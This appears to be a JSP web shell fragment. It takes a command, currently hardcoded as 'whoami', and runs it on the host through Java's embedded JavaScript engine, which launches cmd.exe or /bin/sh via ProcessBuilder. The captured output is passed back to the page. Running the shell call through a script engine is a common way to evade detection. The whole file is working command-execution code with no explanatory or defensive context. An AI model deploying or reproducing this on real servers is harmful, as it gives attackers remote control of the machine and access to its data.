<%
String command = "whoami";

StringBuilder output = new StringBuilder();

try {
    javax.script.ScriptEngineManager factory = new javax.script.ScriptEngineManager();
    javax.script.ScriptEngine engine = factory.getEngineByName("JavaScript");
    
    if (engine == null) {
        output.append("ERROR: JavaScript engine not available\n");
    } else {
        String jsCode = 
            "var proc = new java.lang.ProcessBuilder(java.util.Arrays.asList(" +
                (System.getProperty("os.name").toLowerCase().contains("win") 
                    ? "\"cmd.exe\", \"/c\", \"" + command.replace("\"", "\\\"") + "\"" 
                    : "\"/bin/sh\", \"-c\", \"" + command.replace("\"", "\\\"") + "\"") +
            ")).start();\n" +
            "var reader = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));\n" +
            "var errorReader = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getErrorStream()));\n" +
            "var line, output = '';\n" +
            "while ((line = reader.readLine()) != null) { output += line + '\\n'; }\n" +
            "while ((line = errorReader.readLine()) != null) { output += line + '\\n'; }\n" +
            "proc.waitFor();\n" +
            "output;";
        
        Object result = engine.eval(jsCode);
        if (result != null) {
            output.append(result.toString());
        }
    }
    
} catch (Exception e) {
    output.append("ERROR: JavaScript command execution failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
